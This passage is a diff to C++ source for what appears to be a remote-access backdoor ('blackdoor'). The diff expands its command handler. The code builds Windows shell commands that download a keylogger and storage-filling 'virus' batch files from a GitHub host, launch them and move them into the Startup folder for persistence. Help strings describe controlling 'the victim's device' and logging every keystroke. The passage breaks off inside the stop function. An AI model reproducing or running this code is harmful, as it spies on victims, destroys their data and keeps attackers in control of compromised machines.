@@ -7,15 +7,16 @@
 
 using namespace std;
 
-#define DEFAULT_BUFLEN 4069
-#define DEFAULT_TOTALE_BUFLEN 65104
+#define DEFAULT_BUFLEN 40690
+#define DEFAULT_TOTALE_BUFLEN 651040
 #define DEFAULT_PORT 27015
 
 string Additions(char *buffer);
 // Components Function:
-string CMR_InfoComp(string buffer);
-string CMR_RunComp(string buffer);
-string CMR_StopComp(string buffer);
+string CE_InfoExt(string buffer);
+string CE_RunExt(string buffer);
+string CE_StartupExt(string buffer);
+string CE_StopExt(string buffer);
 
 int strincludes(char *strVar, char *buffer);
 
@@ -177,19 +178,23 @@ string Additions(char *buffer)
             obuf = "powershell -Command \"Get-AppxPackage\"";
         }
     }
-    else if (obuf.find("cmp ") != string::npos)
+    else if (obuf.find("ext ") != string::npos)
     {
         if (obuf.find("info") != string::npos)
         {
-            obuf = CMR_InfoComp(obuf);
+            obuf = CE_InfoExt(obuf);
         }
         else if (obuf.find("run") != string::npos)
         {
-            obuf = CMR_RunComp(obuf);
+            obuf = CE_RunExt(obuf);
+        }
+        else if (obuf.find("startup") != string::npos)
+        {
+            obuf = CE_StartupExt(obuf);
         }
         else if (obuf.find("stop") != string::npos)
         {
-            obuf = CMR_StopComp(obuf);
+            obuf = CE_StopExt(obuf);
         }
     }
     return obuf;
@@ -200,55 +205,87 @@ string Additions(char *buffer)
             Components
 ######################################
 */
-string CMR_InfoComp(string buffer)
+string CE_InfoExt(string buffer)
 {
     string ebuf = buffer;
     if (ebuf.find("keylog") != string::npos)
     {
-        ebuf = "echo [CMP] [INFO] - This components is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ cmp reset keylog \n" +
-               "[ $ ] - Available Commands : \n" +
-               "[ $ cmp run keylog ] ->  for start recording \n" +
-               "[ $ cmp info keylog ] -> show some info for keylog component\n" +
-               "[ $ cmp reset keylog ] -> delete keylog file :  C:\\ProgramData\\Ms\\log.txt \n";
+        ebuf = "echo [EXT] [INFO] - This components is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ ext reset keylog \n";
+        ebuf += "[ $ ] - Available Commands : \n";
+        ebuf += "[ $ ext run keylog ] ->  for start recording \n";
+        ebuf += "[ $ ext info keylog ] -> show some info for keylog component\n";
+        ebuf += "[ $ ext reset keylog ] -> delete keylog file :  C:\\ProgramData\\Ms\\log.txt \n";
     }
     else if (ebuf.find("fill_storage") != string::npos)
     {
-        ebuf = "echo [CMP] [INFO] - This components is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\Users\\s3q\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device" +
-               "[ $ ] - Available Commands : \n" +
-               "[ $ cmp run fill_storage ] ->  for start fill storage \n" +
-               "[ $ cmp startup fill_storage ] -> copying the file fill_storage_move.bat to C:\Users\\s3q\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\n";
-               "[ $ cmp info fill_storage ] -> show some info for fill_storage component\n";
+        ebuf = "echo [EXT] [INFO] - This components is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device \n";
+        ebuf += "[ $ ] - Available Commands : \n";
+        ebuf += "[ $ ext run fill_storage ] ->  for start fill storage \n";
+        ebuf += "[ $ ext startup fill_storage ] -> copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\n";
+        ebuf += "[ $ ext info fill_storage ] -> show some info for fill_storage component\n";
     }
     else
     {
-        ebuf = "echo [CMP] [INFO] - The components are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way \nAvailable components :\n--> keylog\n--> fill_storage\n--> network";
+        ebuf = "echo [EXT] [INFO] - The components are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way \nAvailable components :\n--> keylog\n--> fill_storage\n--> network";
     }
 
     return ebuf;
 }
 
-string CMR_RunComp(string buffer)
+string CE_RunExt(string buffer)
 {
     string ebuf = buffer;
 
-    string compcmd = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";
-
-    string path = "C:\\Ms\\keylogger.exe";
+    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";
 
     if (ebuf.find("keylog") != string::npos)
     {
-        compcmd += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/keylogger.exe -o " + path + " && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo \n[CMP] [DOWNLOAD] - keylogger.exe components \n[CMP] [RUN] - keylog components ..";
-        ebuf = compcmd;
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component ..";
+        ebuf = command;
+    }
+    else if (ebuf.find("fill_storage") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_virus.bat ( start C:\\ProgramData\\Ms\\fill_storage_virus.bat ) ELSE ( echo; ) && echo \n[EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component \n[EXT] [RUN] - fill_storage component ..";
+        ebuf = command;
     }
     else
     {
-        ebuf = "echo [CPM] [ERR] - You must use a valid component name !";
+        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
     }
 
     return ebuf;
 }
 
-string CMR_StopComp(string buffer)
+
+string CE_StartupExt(string buffer)
+{
+    string ebuf = buffer;
+
+    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";
+
+    if (ebuf.find("keylog") != string::npos)
+    {
+        command += "IF NOT EXIST C:\\ProgramData\\Ms\\keylogger.exe ( curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( move C:\\ProgramData\\Ms\\keylogger.exe C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup  ) ELSE ( echo; )";
+        if (ebuf.find("run") != string::npos) {
+            command += " && IF EXIST C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\\keylogger.exe ( start C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\\keylogger.exe )";
+        }
+        command += " && echo \n[EXT] [DOWNLOAD] - keylogger.exe component \n[EXT] [RUN] - keylog component .. ";
+        ebuf = command;
+    }
+    else if (ebuf.find("fill_storage") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/components/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_virus.bat ( start C:\\ProgramData\\Ms\\fill_storage_virus.bat ) ELSE ( echo; ) && echo \n[CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component \n[CMP] [RUN] - fill_storage component ..";
+        ebuf = command;
+    }
+    else
+    {
+        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
+    }
+
+    return ebuf;
+}
+
+string CE_StopExt(string buffer)
 {
     string ebuf = buffer;
     if (ebuf.find("keylog") != string::npos)
